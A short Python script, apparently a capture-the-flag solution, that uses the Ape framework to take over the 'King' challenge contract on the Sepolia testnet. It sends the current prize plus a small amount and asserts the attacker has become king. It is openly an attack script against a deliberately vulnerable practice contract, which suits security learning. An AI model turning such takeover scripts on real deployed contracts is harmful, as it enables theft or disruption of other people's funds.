#!/usr/bin/python3
from ape import accounts, convert, project
from rich.console import Console

# sepolia: 0x902f8598266c868802A980cd7A2d6ffc175275a7
ADDRESS = "0x902f8598266c868802A980cd7A2d6ffc175275a7"

console = Console()


def attack():
    attacker = accounts.load("ctf")
    attacker.set_autosign(True)
    target_contract = project.King.at(ADDRESS)

    console.print(f"[green]Owner Before The Hack: [magenta]{target_contract._king()}")
    console.print("[red]Attacking Now...")
    prize_value = target_contract.prize()
    attacker.transfer(
        value=prize_value + convert("0.000001 eth", int),
        to=target_contract,
        account=attacker,
    )

    assert target_contract._king() == attacker.address
    console.print(f"[green]King After The Hack: [magenta]{target_contract._king()}")


def main():
    attack()


if __name__ == "__main__":
    main()
